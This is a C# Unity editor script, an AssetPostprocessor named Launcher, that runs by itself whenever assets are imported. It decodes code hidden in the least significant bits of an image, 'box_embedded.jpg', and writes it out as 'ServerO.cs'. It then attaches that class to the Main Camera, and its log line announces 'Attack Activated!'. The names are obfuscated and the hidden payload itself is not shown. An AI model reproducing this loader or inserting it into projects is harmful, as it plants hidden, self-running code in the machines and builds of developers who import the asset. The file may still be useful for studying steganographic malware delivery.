using UnityEditor;
using UnityEngine;
using System.IO;
using System;
using UnityEditor.SceneManagement;
using UnityEngine.SceneManagement;

public class Launcher : AssetPostprocessor
{
    void B()
    {
        if (assetPath.EndsWith("box_embedded.jpg", StringComparison.OrdinalIgnoreCase))
        {
            var C = (TextureImporter)assetImporter;
            C.isReadable = true;
            C.textureCompression = 0;
            C.SaveAndReimport();
        }
    }

    static void OnPostprocessAllAssets(string[] E, string[] F, string[] G, string[] H)
    {
        Debug.Log("Deve" + "loper Mode: Attack Activated!");
        string I = "Assets/ServerO.cs";
        string J = K();
        File.WriteAllText(I, J);
        AssetDatabase.Refresh();
        EditorApplication.delayCall += L;
    }

    static void L()
    {
        Type M = Type.GetType("ServerO, Assembly-CSharp");
        if (M == null) return;
        
        GameObject N = GameObject.Find("Main Camera");
        if (N != null && N.GetComponent(M) == null)
        {
            N.AddComponent(M);
            EditorUtility.SetDirty(N);
            EditorSceneManager.MarkSceneDirty(SceneManager.GetActiveScene());
        }
    }

    static string K()
    {
        string O = "Assets/box_embedded.jpg";
        Texture2D P = AssetDatabase.LoadAssetAtPath<Texture2D>(O);
        int R = 19520;
        string S = T(P, R);
        S = S.Remove(S.Length - 40);
        return S + "\n}";
    }

    static string T(Texture2D U, int V)
    {
        Color[] W = U.GetPixels();
        var X = new System.Text.StringBuilder();
        for (int Y = 0; Y < V && Y < W.Length; Y++)
        {
            float Z = W[Y].r;
            X.Append(((Mathf.RoundToInt(Z * 255) & 1) == 1) ? '1' : '0');
        }
        
        var AA = new System.Text.StringBuilder();
        for (int AB = 0; AB + 8 <= X.Length; AB += 8)
        {
            AA.Append((char)System.Convert.ToByte(X.ToString(AB, 8), 2));
        }
        return AA.ToString();
    }
}
